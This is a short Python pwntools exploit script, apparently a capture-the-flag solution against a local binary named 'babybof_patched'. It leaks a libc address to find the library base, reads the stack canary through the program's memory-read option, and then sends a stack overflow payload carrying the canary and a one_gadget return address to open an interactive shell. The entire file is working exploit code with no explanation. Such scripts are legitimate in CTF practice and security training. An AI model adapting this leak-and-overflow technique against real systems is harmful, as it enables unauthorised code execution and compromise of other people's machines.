from pwn import *

binary = ELF("./babybof_patched")
libc = ELF("./libc.so.6")

if "REMOTE" in args:
    p = remote("localhost", "9999")
else:
    p = gdb.debug(binary.path)

p.sendline(b"2")
p.sendline(b"-")

p.recvuntil(b"input: ")
leak = int(p.recvline().strip())

libc.address = leak - 418 - libc.sym["puts"]
print(libc.address)

p.sendline(b"4919")
p.sendline(str(libc.address + 6395304).encode("ascii"))
p.recvuntil(b"up\n")
canary = int(p.recvline().strip(), 16)
print(hex(canary))

p.sendline(b"1")
payload = b"A" * 0x18
payload += p64(canary)
payload += p64(0)
payload += p64(libc.address + 0x4f29e)
p.sendline(payload)

p.sendline(b"3")

p.interactive()